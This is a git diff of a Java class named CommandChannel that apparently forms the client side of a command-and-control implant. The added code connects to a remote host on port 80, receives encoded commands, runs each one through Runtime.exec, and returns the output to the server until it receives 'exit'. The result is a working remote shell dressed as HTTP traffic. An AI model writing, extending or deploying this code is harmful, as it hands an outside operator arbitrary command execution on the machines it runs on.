@@ -1,17 +1,14 @@
 package networking;
 
 
-import java.awt.SecondaryLoop;
 import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
-import java.net.SocketAddress;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.stream.Collectors;
 
 public class CommandChannel implements Runnable{
 	String ip;
@@ -28,21 +25,23 @@ public class CommandChannel implements Runnable{
 	public void run() {
 			try {
 				while(true){
-					System.out.println("[-] Exchange Begins");
+					System.out.println("[-] HTTP Command Channel: Exchange Begins");
 					Socket s=new Socket(ip,80);
 					String serverHello = readAll(s); //Server Hello
 					String decoded = decodeResponse(serverHello);
-					System.out.println(decoded);
-					System.out.println("[-] Server Hello Recieved");
+					System.out.println("[>] HTTP Command Channel: "+decoded);
+					System.out.println("[-] HTTP Command Channel: Server Hello Recieved");
 					sendAll(s, "Client Is Ready!");
-					System.out.println("[-] Client Hello Sent");
-					Thread.sleep(1000);
-					break;
+					System.out.println("[-] HTTP Command Channel: Client Hello Sent");
+					String command = "";
+					while(!command.contentEquals("exit")) {
+						command = decodeResponse(readAll(s));
+						Process p = Runtime.getRuntime().exec(command);
+						String output = inputStream2String(p.getInputStream());
+						sendAll(s,output);
+					}
 				}
 			} catch (IOException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			} catch (InterruptedException e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
 			}
@@ -81,7 +80,16 @@ public class CommandChannel implements Runnable{
 		
 		return output;
 	}
+	private String inputStream2String(InputStream inStream) throws IOException {
+		ByteArrayOutputStream baos = new ByteArrayOutputStream();
+		int read = inStream.read();
+		while(read!=-1) {
+			baos.write(read);
+			read = inStream.read();
+		}
 		
+		return new String(baos.toByteArray());
+	}
 	private ArrayList<String> encodeResponse(String message){
 		ArrayList<String> temp = new ArrayList<String>();
 		List<String> inputChunks = NetUtil.getParts(message, 3);
